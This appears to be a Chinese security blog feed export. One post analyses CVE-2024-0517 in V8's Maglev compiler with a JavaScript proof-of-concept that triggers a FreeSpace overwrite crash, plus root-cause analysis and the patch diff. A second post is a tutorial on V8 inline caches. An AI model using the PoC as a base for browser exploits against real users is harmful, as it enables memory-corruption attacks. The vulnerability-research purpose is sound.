><figcaption>image-20250528192652872</figcaption></figure></p><blockquote><p>gc()会</p><ul><li>触发垃圾回收，可能清理掉之前分配的对象，腾出FreeSpace空间。</li><li>如果恰好有之前构造的对象被释放，它们的空间将变为FreeSpace。</li></ul></blockquote><h4 id="Overwriting-a-FreeSpace-object"><a href="#Overwriting-a-FreeSpace-object" class="headerlink" title="Overwriting a FreeSpace object"></a>Overwriting a FreeSpace object</h4><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">minor_gc</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x10000</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x;</span><br><span class="line"><span class="keyword">let</span> a;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123; &#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_ inherited__">A</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        x = <span class="keyword">new</span>.<span class="property">target</span>;</span><br><span class="line">        <span class="variable language_">super</span>();</span><br><span class="line">        <span class="title function_">minor_gc</span>();<span class="comment">//触发新生代垃圾回收</span></span><br><span class="line">        a = [<span class="number">1.1</span>]; <span class="comment">// overwrite FreeSpace object</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123; <span class="keyword">new</span> <span class="title function_">B</span>(); &#125; <span class="comment">// optimization</span></span><br></pre></td></tr></table></figure></div><blockquote><p>最后通过重复调用B的构造函数</p><ol><li>触发Maglev的优化机制，让B的构造函数被内联优化。</li><li>制造堆上的内存碎片和复杂的分配行为，提高覆盖 FreeSpace 的概率。</li></ol></blockquote><p>因此运行会发现，在经过了几秒后，会有一次成功覆盖，触发<code>SEGV_ACCERR</code>表示非法访问</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/image-20250528195625190.png"                      alt="image-20250528195625190"                ><figcaption>image-20250528195625190</figcaption></figure></p><p>主要原因其实是Maglev 在构建对象分配时（<code>VisitFindNonDefaultConstructorOrConstruct</code>），没有初始化<code>current_raw_allocation_</code> </p><ul><li><code>current_raw_allocation_</code>: 当前正在使用的连续分配内存块</li></ul><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* src/maglev/maglev-graph-builder.cc:8520 */</span></span><br><span class="line"><span class="function">ValueNode* <span class="title">MaglevGraphBuilder::ExtendOrReallocateCurrentRawAllocation</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">int</span> size, AllocationType allocation_type)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!current_raw_allocation_ ||</span><br><span class="line">      current_raw_allocation_-&gt;<span class="built_in">allocation_type</span>() != allocation_type ||</span><br><span class="line">      !v8_flags.inline_new) &#123;</span><br><span class="line">    current_raw_allocation_ =</span><br><span class="line">        <span class="built_in">AddNewNode</span>&lt;AllocateRaw&gt;(&#123;&#125;, allocation_type, size);</span><br><span class="line">    <span class="keyword">return</span> current_raw_allocation_;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> current_size = current_raw_allocation_-&gt;<span class="built_in">size</span>();</span><br><span class="line">  <span class="keyword">if</span> (current_size + size &gt; kMaxRegularHeapObjectSize) &#123;</span><br><span class="line">    <span class="keyword">return</span> current_raw_allocation_ =</span><br><span class="line">               <span class="built_in">AddNewNode</span>&lt;AllocateRaw&gt;(&#123;&#125;, allocation_type, size);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">DCHECK_GT</span>(current_size, <span class="number">0</span>);</span><br><span class="line">  <span class="type">int</span> previous_end = current_size;</span><br><span class="line">  current_raw_allocation_-&gt;<span class="built_in">extend</span>(size);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">AddNewNode</span>&lt;FoldedAllocation&gt;(&#123;current_raw_allocation_&#125;, previous_end);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/image-20250528200614647.png"                      alt="image-20250528200614647"                ><figcaption>image-20250528200614647</figcaption></figure></p><blockquote><ol><li>V8首先将源代码转成AST，<code>super();</code>会被转换成Super类型的call节点</li><li>解释器解释call节点时会调用<code>VisitCall</code>，而对于Super类型的call节点，会继续调用<code>VisitCallSuper</code>，最终会执行<code>FindNonDefaultConstructorOrContruct</code>指令</li><li>由于<code>for (let i = 0; i &lt; 1000; i++) &#123; new B(); &#125; </code> 因此<code>super();</code>会被JIT识别成hot code，Maglev开始优化，处理<code>FindNonDefaultConstructorOrContruct</code>指令时会调用<code>VisitFindNonDefaultConstructorOrConstruct</code>函数</li><li>而如果恰好在上图用<code>VisitFindNonDefaultConstructorOrConstruct</code>函数的[1]处发生了gc，此时创建的B类实例会被移动到老年代，但是<code>current_raw_allocation_</code>还指向旧的内存空间（此时变成FreeSpace），而由于Maglev的分配折叠优化，会接着向这段FreeSpace写入数组[1.1]，引发了<code>SEGV_ACCERR</code></li></ol></blockquote><h3 id="Patch分析"><a href="#Patch分析" class="headerlink" title="Patch分析"></a>Patch分析</h3><div class="highlight-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@@ -5597,6 +5597,7 @@</span></span><br><span class="line">           object = BuildAllocateFastObject(</span><br><span class="line">               FastObject(new_target_function-&gt;AsJSFunction(), zone(), broker()),</span><br><span class="line">               AllocationType::kYoung);</span><br><span class="line"><span class="addition">+          ClearCurrentRawAllocation();</span></span><br><span class="line">         &#125; else &#123;</span><br><span class="line">           object = BuildCallBuiltin&lt;Builtin::kFastNewObject&gt;(</span><br><span class="line">               &#123;GetConstant(current_function), new_target&#125;);</span><br></pre></td></tr></table></figure></div><p>patch只添加了一行，在<code>BuildAllocateFastObject()</code>之后立即调用<code>ClearCurrentRawAllocation()</code>，让<code>current_raw_allocation_</code>被重置或清除，防止因为分配折叠优化而接着在后续FreeSpace中写入数据。</p><h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>TODO…👩🏻‍💻</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a class="link"   href="https://www.vicarius.io/vsociety/posts/out-of-bound-write-in-v8-javascript-engine-cve-2024-0517" >https://www.vicarius.io/vsociety/posts/out-of-bound-write-in-v8-javascript-engine-cve-2024-0517 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://bnovkebin.github.io/blog/CVE-2024-0517/" >https://bnovkebin.github.io/blog/CVE-2024-0517/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://research.qianxin.com/archives/2720" >https://research.qianxin.com/archives/2720 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit?tab=t.0" >https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit?tab=t.0 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> JIT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js-engine </tag>
            
            <tag> v8 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>V8-pwn入门(3)——Inline-Cache、GC、JIT</title>
      <link href="/2024/11/17/V8-pwn%E5%85%A5%E9%97%A8-3-%E2%80%94%E2%80%94Inline-Cache%E3%80%81GC%E3%80%81JIT/"/>
      <url>/2024/11/17/V8-pwn%E5%85%A5%E9%97%A8-3-%E2%80%94%E2%80%94Inline-Cache%E3%80%81GC%E3%80%81JIT/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-Inline-Cache🗺️"><a href="#0x00-Inline-Cache🗺️" class="headerlink" title="0x00 Inline Cache🗺️"></a>0x00 Inline Cache🗺️</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>Inline Cache 是一种基于历史访问模式的缓存技术，主要用于加速以下操作：</p><ul><li><strong>属性访问</strong>（如 <code>obj.prop</code>）</li><li><strong>方法调用</strong>（如 <code>obj.method()</code>）</li><li><strong>属性设置</strong>（如 <code>obj.prop = value</code>）</li><li><strong>全局变量访问</strong></li></ul><p>那么这种缓存是怎么实现的？🤔其实就是之前提到的Hidden Class(也就是Map)，以属性访问为例，对于一个obj的map，如果想访问<code>obj.X</code>，我们可以缓存obj的Map，而<code>obj.X</code>作为一个name property在Map中properties array的偏移是固定的，因此可以直接取出，不用再用<code>X</code>这个key去Map中的properties array检索，从而加速属性访问</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><ul><li>0 uninitialized：未初始化</li><li>. premonomorphic：单态之前</li><li>1 monomorphic：单态</li><li>^ recompute handler：重新计算处理器</li><li>P polymorphic：多态</li><li>N megamorphic：巨型缓存状态</li><li>G generic：通用</li></ul><h3 id="基本过程"><a href="#基本过程" class="headerlink" title="基本过程"></a>基本过程</h3><p>具体可参考<a class="link"   href="https://mp.weixin.qq.com/s/mbJJAiGz0OAd2IOc8K5Mkg" >https://mp.weixin.qq.com/s/mbJJAiGz0OAd2IOc8K5Mkg <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>?</p><p>简单来说，只有在第二次访问<code>obj.X</code>时（第二次产生IC-Miss），会编译生成<code>IC-Hit Handler</code>，把<code>IC-Hit Handler</code>和<code>Map</code>加入缓存，之后第三次访问<code>obj.X</code>速度会大大提升。</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/image-20241117180023224.png"                      alt="image-20241117180023224"                ><figcaption>image-20241117180023224</figcaption></figure></p><h3 id="Monomorphic-单态）"><a href="#Monomorphic-单态）" class="headerlink" title="Monomorphic(单态）"></a>Monomorphic(单态）</h3><p>此时需要缓存的只有一种map，也就是说一个object被定义后，不会添加&#x2F;删除property，也就不会改变Hidden Class(Map)</p><p>举个例子🌰</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 利用--print-bytecode可以看字节码</span></span><br><span class="line"><span class="keyword">let</span> o = &#123;sloth : <span class="number">1440</span>&#125;;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getSloth</span>(<span class="params">obj</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> obj.<span class="property">sloth</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;i++)<span class="comment">//触发inline Cache</span></span><br><span class="line"><span class="title function_">getSloth</span>(o);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(getSloth);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line">[generated bytecode <span class="keyword">for</span> <span class="attr">function</span>: getSloth]</span><br><span class="line"><span class="title class_">Parameter</span> count <span class="number">2</span></span><br><span class="line"><span class="title class_">Register</span> count <span class="number">0</span></span><br><span class="line"><span class="title class_">Frame</span> size <span class="number">0</span></span><br><span class="line">   <span class="number">41</span> E&gt; <span class="number">0x1ebf58a1fb42</span> @    <span class="number">0</span> : a5                <span class="title class_">StackCheck</span></span><br><span class="line">   <span class="number">61</span> S&gt; <span class="number">0x1ebf58a1fb43</span> @    <span class="number">1</span> : <span class="number">28</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>       <span class="title class_">LdaNamedProperty</span> a0, [<span class="number">0</span>], [<span class="number">0</span>]</span><br><span class="line">   <span class="number">67</span> S&gt; <span class="number">0x1ebf58a1fb47</span> @    <span class="number">5</span> : a9                <span class="title class_">Return</span></span><br><span class="line"><span class="title class_">Constant</span> <span class="title function_">pool</span> (size = <span class="number">1</span>)</span><br><span class="line"><span class="number">0x1ebf58a1faf1</span>: [<span class="title class_">FixedArray</span>] <span class="keyword">in</span> <span class="title class_">OldSpace</span></span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x336a62180801</span> &lt;<span class="title class_">Map</span>&gt;</span><br><span class="line"> - <span class="attr">length</span>: <span class="number">1</span></span><br><span class="line">           <span class="number">0</span>: <span class="number">0x1ebf58a1f229</span> &lt;<span class="title class_">String</span>[#<span class="number">5</span>]: sloth&gt;</span><br><span class="line"><span class="title class_">Handler</span> <span class="title class_">Table</span> (size = <span class="number">0</span>)</span><br><span class="line"><span class="number">0x1ebf58a1f611</span> &lt;<span class="title class_">JSFunction</span> <span class="title function_">getSloth</span> (sfi = <span class="number">0x1ebf58a1f371</span>)&gt;</span><br></pre></td></tr></table></figure></div><blockquote><p>可以看到生成的字节码很简单，就是用一个<code>LdaNamedProperty</code></p><p>在V8源码src&#x2F;interpreter&#x2F;interpreter-gengerator.cc有解释<code>LdaNamedProperty</code>的使用规范</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// LdaNamedProperty &lt;object&gt; &lt;name_index&gt; &lt;slot&gt;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Calls the LoadIC at FeedBackVector slot &lt;slot&gt; for &lt;object&gt; and the name at</span></span><br><span class="line"><span class="comment">// constant pool entry &lt;name_index&gt;.</span></span><br></pre></td></tr></table></figure></div><p>具体来说第一个参数就是要访问的object，第二个是name object的name在常量池中的index，第三个参数是个slot，主要是指明调用<code> FeedBackVector</code>中的哪个LoadIC</p><p>我们可以跟进一下看看这个<code>FeedBackVector</code></p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job <span class="number">0x1ebf58a1f611</span> <span class="comment">//先看看Function</span></span><br><span class="line"><span class="number">0x1ebf58a1f611</span>: [<span class="title class_">Function</span>] <span class="keyword">in</span> <span class="title class_">OldSpace</span></span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x0058089003b9</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x1ebf58a02109</span> &lt;<span class="title class_">JSFunction</span> (sfi = <span class="number">0x76000683b29</span>)&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x336a62180c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; [<span class="variable constant_">HOLEY_ELEMENTS</span>]</span><br><span class="line"> - <span class="keyword">function</span> <span class="attr">prototype</span>:</span><br><span class="line"> - <span class="attr">initial_map</span>:</span><br><span class="line"> - <span class="attr">shared_info</span>: <span class="number">0x1ebf58a1f371</span> &lt;<span class="title class_">SharedFunctionInfo</span> getSloth&gt;</span><br><span class="line"> - <span class="attr">name</span>: <span class="number">0x1ebf58a1f241</span> &lt;<span class="title class_">String</span>[#<span class="number">8</span>]: getSloth&gt;</span><br><span class="line"> - <span class="attr">formal_parameter_count</span>: <span class="number">1</span></span><br><span class="line"> - <span class="attr">kind</span>: <span class="title class_">NormalFunction</span></span><br><span class="line"> - <span class="attr">context</span>: <span class="number">0x1ebf58a1f5d9</span> &lt;<span class="title class_">ScriptContext</span>[<span class="number">5</span>]&gt;</span><br><span class="line"> - <span class="attr">code</span>: <span class="number">0x176fcf304101</span> &lt;<span class="title class_">Code</span> <span class="variable constant_">BUILTIN</span> <span class="title class_">InterpreterEntryTrampoline</span>&gt;</span><br><span class="line"> - interpreted</span><br><span class="line"> - <span class="attr">bytecode</span>: <span class="number">0x1ebf58a1fb09</span> &lt;<span class="title class_">BytecodeArray</span>[<span class="number">6</span>]&gt;</span><br><span class="line"> - source <span class="attr">code</span>: (obj) &#123;</span><br><span class="line"><span class="keyword">return</span> obj.<span class="property">sloth</span>;</span><br><span class="line">&#125;</span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x336a62180c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    #<span class="attr">length</span>: <span class="number">0x0760006804b9</span> &lt;<span class="title class_">AccessorInfo</span>&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line">    #<span class="attr">name</span>: <span class="number">0x076000680449</span> &lt;<span class="title class_">AccessorInfo</span>&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line">    #<span class="attr">arguments</span>: <span class="number">0x076000680369</span> &lt;<span class="title class_">AccessorInfo</span>&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line">    #<span class="attr">caller</span>: <span class="number">0x0760006803d9</span> &lt;<span class="title class_">AccessorInfo</span>&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line">    #<span class="attr">prototype</span>: <span class="number">0x076000680529</span> &lt;<span class="title class_">AccessorInfo</span>&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> - feedback <span class="attr">vector</span>: <span class="number">0x1ebf58a1fb79</span>: [<span class="title class_">FeedbackVector</span>] <span class="keyword">in</span> <span class="title class_">OldSpace</span> <span class="comment">//🌟跟进</span></span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x336a62180c11</span> &lt;<span class="title class_">Map</span>&gt;</span><br><span class="line"> - <span class="attr">length</span>: <span class="number">2</span></span><br><span class="line"> - shared <span class="keyword">function</span> <span class="attr">info</span>: <span class="number">0x1ebf58a1f371</span> &lt;<span class="title class_">SharedFunctionInfo</span> getSloth&gt;</span><br><span class="line"> - optimized code/<span class="attr">marker</span>: <span class="title class_">OptimizationMarker</span>::kNone</span><br><span class="line"> - invocation <span class="attr">count</span>: <span class="number">20</span></span><br><span class="line"> - profiler <span class="attr">ticks</span>: <span class="number">0</span></span><br><span class="line"> - slot #<span class="number">0</span> <span class="title class_">LoadProperty</span> <span class="variable constant_">MONOMORPHIC</span> &#123;</span><br><span class="line">     [<span class="number">0</span>]: [weak] <span class="number">0x00580890ab39</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt;</span><br><span class="line">     [<span class="number">1</span>]: <span class="number">836</span></span><br><span class="line">  &#125;</span><br><span class="line">pwndbg&gt; job  <span class="number">0x1ebf58a1fb79</span> <span class="comment">//看看FeedbackVector</span></span><br><span class="line"><span class="number">0x1ebf58a1fb79</span>: [<span class="title class_">FeedbackVector</span>] <span class="keyword">in</span> <span class="title class_">OldSpace</span></span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x336a62180c11</span> &lt;<span class="title class_">Map</span>&gt;</span><br><span class="line"> - <span class="attr">length</span>: <span class="number">2</span></span><br><span class="line"> - shared <span class="keyword">function</span> <span class="attr">info</span>: <span class="number">0x1ebf58a1f371</span> &lt;<span class="title class_">SharedFunctionInfo</span> getSloth&gt;</span><br><span class="line"> - optimized code/<span class="attr">marker</span>: <span class="title class_">OptimizationMarker</span>::kNone</span><br><span class="line"> - invocation <span class="attr">count</span>: <span class="number">20</span></span><br><span class="line"> - profiler <span class="attr">ticks</span>: <span class="number">0</span></span><br><span class="line"> - slot #<span class="number">0</span> <span class="title class_">LoadProperty</span> <span class="variable constant_">MONOMORPHIC</span> &#123; </span><br><span class="line">     [<span class="number">0</span>]: [weak] <span class="number">0x00580890ab39</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt; <span class="comment">//最后被调用的LoadIC，其实是个Map</span></span><br><span class="line">     [<span class="number">1</span>]: <span class="number">836</span></span><br><span class="line">  &#125;</span><br><span class="line">pwndbg&gt; job <span class="number">0x00580890ab39</span> <span class="comment">//看看Map，可以发现是某个Object的map</span></span><br><span class="line"><span class="number">0x580890ab39</span>: [<span class="title class_">Map</span>]</span><br><span class="line"> - <span class="attr">type</span>: <span class="variable constant_">JS_OBJECT_TYPE</span></span><br><span class="line"> - instance <span class="attr">size</span>: <span class="number">32</span></span><br><span class="line"> - inobject <span class="attr">properties</span>: <span class="number">1</span></span><br><span class="line"> - elements <span class="attr">kind</span>: <span class="variable constant_">HOLEY_ELEMENTS</span></span><br><span class="line"> - unused property <span class="attr">fields</span>: <span class="number">0</span></span><br><span class="line"> - enum <span class="attr">length</span>: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back <span class="attr">pointer</span>: <span class="number">0x00580890aae9</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt;</span><br><span class="line"> - prototype_validity <span class="attr">cell</span>: <span class="number">0x076000680609</span> &lt;<span class="title class_">Cell</span> value= <span class="number">1</span>&gt;</span><br><span class="line"> - instance <span class="title function_">descriptors</span> (own) #<span class="number">1</span>: <span class="number">0x14305458ddf9</span> &lt;<span class="title class_">DescriptorArray</span>[<span class="number">1</span>]&gt; 🌟</span><br><span class="line"> - layout <span class="attr">descriptor</span>: (nil)</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x1ebf58a02091</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x5808900229</span>&gt;</span><br><span class="line"> - <span class="attr">constructor</span>: <span class="number">0x1ebf58a020c9</span> &lt;<span class="title class_">JSFunction</span> <span class="title class_">Object</span> (sfi = <span class="number">0x760006857e9</span>)&gt;</span><br><span class="line"> - dependent <span class="attr">code</span>: <span class="number">0x336a621802c1</span> &lt;<span class="title class_">Other</span> heap <span class="title function_">object</span> (<span class="variable constant_">WEAK_FIXED_ARRAY_TYPE</span>)&gt;</span><br><span class="line"> - construction <span class="attr">counter</span>: <span class="number">0</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x14305458ddf9</span> <span class="comment">//看看descriptors ，也就是存property的地方</span></span><br><span class="line"><span class="number">0x14305458ddf9</span>: [<span class="title class_">DescriptorArray</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x336a62180271</span> &lt;<span class="title class_">Map</span>&gt;</span><br><span class="line"> - <span class="attr">enum_cache</span>: empty</span><br><span class="line"> - nof slack <span class="attr">descriptors</span>: <span class="number">0</span></span><br><span class="line"> - nof <span class="attr">descriptors</span>: <span class="number">1</span></span><br><span class="line"> - raw marked <span class="attr">descriptors</span>: mc epoch <span class="number">0</span>, marked <span class="number">0</span></span><br><span class="line">  [<span class="number">0</span>]: #<span class="title function_">sloth</span> (<span class="keyword">const</span> data field <span class="number">0</span>:s, <span class="attr">p</span>: <span class="number">0</span>, <span class="attr">attrs</span>: [<span class="variable constant_">WEC</span>]) @ <span class="title class_">Any</span> <span class="comment">//就是我们访问的那个obj，属性是sloth</span></span><br></pre></td></tr></table></figure></div><ul><li>可以发现<code>FeedBackVector</code>的slot中其实就是存储了一个个缓存的Map，<code>LdaNamedProperty </code>调用slot中的[0]，也就对应了触发Inline Cache的<code>obj.sloth</code>的这个<code>obj</code>的Map</li><li>同时<code>FeedBackVector</code>的slot中还有一个元素<code>slto[1]:836</code>，前面说到触发Inline Cache后，会把<code>IC-Hit Handler</code>和<code>Map</code>加入缓存，这个836就是<code>IC-Hit Handler</code>（Handler是V8封装的指针）<ul><li><strong>IC-Hit Handler</strong> 是指当 Inline Cache机制匹配上之前缓存的信息时，直接触发执行的处理逻辑</li><li>如果当前操作模式和缓存的信息匹配（<strong>IC hit</strong>），V8 会直接使用缓存的 Handler 来执行该操作，而不是重新进行属性查找或类型判断。</li></ul></li></ul></blockquote><h4 id="触发JIT的情况"><a href="#触发JIT的情况" class="headerlink" title="触发JIT的情况"></a>触发JIT的情况</h4><p>把循环次数加大到一定数量，就会触发JIT优化，会将hot code直接转换成汇编</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o = &#123;sloth : <span class="number">1440</span>&#125;;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getSloth</span>(<span class="params">obj</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> obj.<span class="property">sloth</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">100000</span>;i++)<span class="comment">//触发inline Cache &amp; JIT</span></span><br><span class="line"><span class="title function_">getSloth</span>(o);</span><br></pre></td></tr></table></figure></div><p>具体汇编逻辑类似</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">      mov ecx, &quot;sloth&quot;</span><br><span class="line">      mov eax, obj</span><br><span class="line">      cmp [eax + kMapOffset], &lt;cached map of obj&gt; # 首先比较传入函数的object的Map是否与Cache中的Map一致</span><br><span class="line">      jne miss</span><br><span class="line">      mov eax, [eax + kPropertiesOffset] </span><br><span class="line">      mov eax, [eax + &lt;cached offset of property sloth&gt;] #直接根据offset访问property</span><br><span class="line">      jmp done</span><br><span class="line">miss:</span><br><span class="line">call IC_Miss</span><br><span class="line">done:</span><br></pre></td></tr></table></figure></div><h3 id="polymorphic（多态）"><a href="#polymorphic（多态）" class="headerlink" 